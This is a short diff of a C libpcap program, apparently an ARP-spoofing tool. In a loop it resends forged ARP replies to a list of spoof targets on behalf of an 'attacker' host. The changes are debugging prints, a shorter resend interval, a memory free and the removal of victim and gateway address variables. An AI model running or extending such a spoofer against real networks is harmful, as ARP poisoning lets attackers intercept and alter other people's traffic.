@@ -2,14 +2,6 @@
 
 char *dev;
 char errbuf[1000];
-const u_char *packet;
-
-uint8_t MAC_attack[6];
-uint8_t MAC_victim[6];
-uint8_t MAC_broad[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-uint8_t IP_attack[4];
-uint8_t IP_victim[4];
-uint8_t IP_gateway[4];
 
 pcap_t *handle;
 struct spoofTarget *spoofList;
@@ -18,10 +10,11 @@ int slen;
 
 void preserve() {
 	while(1) {
+		printf("Hello!\n");
 		for (int i = 0 ; i < slen ; i++) {
 			sendARP(handle, spoofList + i, &attacker);
 		}
-		sleep(5000);
+		sleep(5);
 	}
 }
 
@@ -66,7 +59,7 @@ int main(int argc, char *argv[]) {
 	struct pcap_pkthdr *hdr;
 	while(1) {
 		if(!load(handle, &hdr, &pkt)) break;
-
+		printf("WOW!\n");
 		if (isARP(pkt)) {
 			for (int i = 0 ; i < slen ; i++) {
 				sendARP(handle, spoofList + i, &attacker);
@@ -88,7 +81,7 @@ int main(int argc, char *argv[]) {
 	}
 
 	printf("Interface closed.\n");
-	
+	free(spoofList);	
 }
 
 
